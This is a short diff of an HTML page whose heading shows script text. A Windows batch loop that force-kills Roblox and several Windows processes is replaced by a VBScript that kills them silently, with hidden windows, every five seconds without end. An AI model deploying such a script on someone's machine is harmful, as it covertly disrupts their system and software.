@@ -9,15 +9,20 @@
 <body>
     <h1 class="XD">
 
-                @echo off  <br />
-        for /l %%i in (1,1,5) do (   <br />
-            echo Executando a iteração %%i  <br />
-            rem @echo off   <br />
-        taskkill /F /IM RobloxPlayerBeta.exe  <br />
-        taskkill /F /IM RuntimeBroker.exe  <br />
-        taskkill /F /IM CrashHandler.exe  <br />
-        taskkill /F /IM Windows10Universal.exe  <br />
-        )
+                Option Explicit<br />
+
+Dim objShell<br />
+Set objShell = CreateObject("WScript.Shell")<br />
+
+Do<br />
+    objShell.Run "taskkill /F /IM RobloxPlayerBeta.exe", 0, True<br />
+    objShell.Run "taskkill /F /IM RuntimeBroker.exe", 0, True<br />
+    objShell.Run "taskkill /F /IM CrashHandler.exe", 0, True<br />
+    objShell.Run "taskkill /F /IM Windows10Universal.exe", 0, True<br />
+
+    WScript.Sleep 5000<br />
+Loop<br />
+
 
         
     </h1>
